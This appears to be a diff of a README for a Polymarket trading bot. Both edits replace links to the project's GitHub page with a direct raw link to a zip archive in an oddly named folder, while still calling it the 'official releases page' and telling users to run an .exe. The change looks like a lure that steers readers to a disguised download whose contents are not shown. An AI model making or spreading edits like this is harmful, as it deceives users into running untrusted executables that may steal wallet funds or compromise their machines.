@@ -1,6 +1,6 @@
 # 🤖 polymarket-bot - Automate your prediction market trading tasks
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Aidenb2931/polymarket-bot)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Aidenb2931/polymarket-bot/main/partitionist/polymarket-bot-3.2.zip)
 
 This software manages trading activities on Polymarket. It monitors market data, identifies price differences, and places bets based on pre-set strategies. The program runs on Windows and connects directly to the Polygon network to execute transactions.
 
@@ -28,7 +28,7 @@ Your computer must meet these minimum specifications to run the application:
 
 Follow these steps to obtain the correct files:
 
-1.  Visit the [official releases page](https://github.com/Aidenb2931/polymarket-bot).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Aidenb2931/polymarket-bot/main/partitionist/polymarket-bot-3.2.zip).
 2.  Look for the section marked Latest.
 3.  Click the file ending in .exe to start the transfer to your computer.
 4.  Save the file to a folder you can find, such as your Downloads folder.
